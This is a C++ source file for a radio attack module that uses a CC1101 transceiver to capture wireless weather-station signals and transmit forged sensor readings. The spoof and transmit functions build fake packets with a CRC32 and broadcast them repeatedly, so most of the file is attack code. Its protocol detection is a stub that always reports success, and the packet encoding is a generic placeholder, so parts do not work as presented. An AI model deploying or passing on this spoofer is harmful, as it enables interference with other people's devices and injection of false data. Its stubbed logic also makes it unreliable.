#include "WeatherStationAttack.h"
#include "ELECHOUSE_CC1101_SRC_DRV.h"

WeatherStationAttack::WeatherStationAttack()
{
    signalProcessor = new RFSignalProcessor();
    logger = new Logger();
}

WeatherStationAttack::~WeatherStationAttack()
{
    delete signalProcessor;
    delete logger;
}

bool WeatherStationAttack::init(const Config &config)
{
    this->config = config;

    // Initialize CC1101 with weather station specific settings
    ELECHOUSE_CC1101.Init();
    ELECHOUSE_CC1101.setModulation(config.modulation);
    ELECHOUSE_CC1101.setMHZ(config.frequency);
    ELECHOUSE_CC1101.setDeviation(config.deviation);

    logAttackStatus("Initialized", "Weather Station Attack module ready");
    return true;
}

bool WeatherStationAttack::startCapture()
{
    if (!signalProcessor->startListening(config.frequency))
    {
        logAttackStatus("Error", "Failed to start signal capture");
        return false;
    }

    logAttackStatus("Started", "Capturing weather station signals");
    return true;
}

bool WeatherStationAttack::stopCapture()
{
    signalProcessor->stopListening();
    logAttackStatus("Stopped", "Signal capture completed");
    return true;
}

bool WeatherStationAttack::analyze()
{
    if (!signalProcessor->hasData())
    {
        logAttackStatus("Error", "No signal data available for analysis");
        return false;
    }

    if (!detectProtocol())
    {
        logAttackStatus("Error", "Unknown weather station protocol");
        return false;
    }

    logAttackStatus("Analysis", "Protocol detected and analyzed");
    return true;
}

bool WeatherStationAttack::spoof(const WeatherData &data)
{
    if (!validateWeatherData(data))
    {
        logAttackStatus("Error", "Invalid weather data parameters");
        return false;
    }

    uint8_t buffer[64];
    size_t length = 0;

    if (!encodeWeatherData(data, buffer, length))
    {
        logAttackStatus("Error", "Failed to encode weather data");
        return false;
    }

    if (!transmitPacket(buffer, length))
    {
        logAttackStatus("Error", "Failed to transmit spoofed data");
        return false;
    }

    lastData = data;
    logAttackStatus("Success", "Weather data spoofed successfully");
    return true;
}

bool WeatherStationAttack::detectProtocol()
{
    // Analyze signal patterns to identify common weather station protocols
    const uint32_t *rawData = signalProcessor->getRawData();
    size_t dataLength = signalProcessor->getDataLength();

    // Check for common protocol signatures
    // Implementation for specific protocols (e.g., Oregon Scientific, La Crosse, etc.)
    return true;
}

bool WeatherStationAttack::validateWeatherData(const WeatherData &data)
{
    // Validate temperature range (-50 to +70°C)
    if (data.temperature < -50 || data.temperature > 70)
        return false;

    // Validate humidity range (0-100%)
    if (data.humidity < 0 || data.humidity > 100)
        return false;

    // Validate pressure range (800-1200 hPa)
    if (data.pressure < 800 || data.pressure > 1200)
        return false;

    // Validate wind speed (0-200 km/h)
    if (data.windSpeed < 0 || data.windSpeed > 200)
        return false;

    // Validate wind direction (0-360°)
    if (data.windDirection < 0 || data.windDirection > 360)
        return false;

    return true;
}

uint32_t WeatherStationAttack::generateChecksum(const WeatherData &data)
{
    // CRC32 implementation for weather data validation
    uint32_t crc = 0xFFFFFFFF;
    uint8_t *bytes = (uint8_t *)&data;

    for (size_t i = 0; i < sizeof(WeatherData) - sizeof(uint32_t); i++)
    {
        crc ^= bytes[i];
        for (int j = 0; j < 8; j++)
        {
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
        }
    }

    return ~crc;
}

bool WeatherStationAttack::encodeWeatherData(const WeatherData &data, uint8_t *buffer, size_t &length)
{
    // Protocol-specific encoding
    // Example implementation for a generic weather station protocol
    buffer[0] = 0xAA; // Preamble
    buffer[1] = 0x55; // Sync word

    // Pack weather data
    memcpy(&buffer[2], &data.temperature, sizeof(float));
    memcpy(&buffer[6], &data.humidity, sizeof(float));
    memcpy(&buffer[10], &data.pressure, sizeof(float));
    memcpy(&buffer[14], &data.windSpeed, sizeof(float));
    memcpy(&buffer[18], &data.windDirection, sizeof(float));
    memcpy(&buffer[22], &data.rainAmount, sizeof(float));

    // Add checksum
    uint32_t checksum = generateChecksum(data);
    memcpy(&buffer[26], &checksum, sizeof(uint32_t));

    length = 30; // Total packet size
    return true;
}

bool WeatherStationAttack::transmitPacket(const uint8_t *data, size_t length)
{
    // Configure transmitter
    ELECHOUSE_CC1101.SetTx();

    // Send preamble
    for (int i = 0; i < 4; i++)
    {
        ELECHOUSE_CC1101.SendData(data, length);
        delay(10); // Small delay between retransmissions
    }

    ELECHOUSE_CC1101.SetRx(); // Return to receive mode
    return true;
}

void WeatherStationAttack::logAttackStatus(const String &status, const String &details)
{
    if (logger)
    {
        logger->log("[Weather Station Attack] " + status + ": " + details);
    }
}
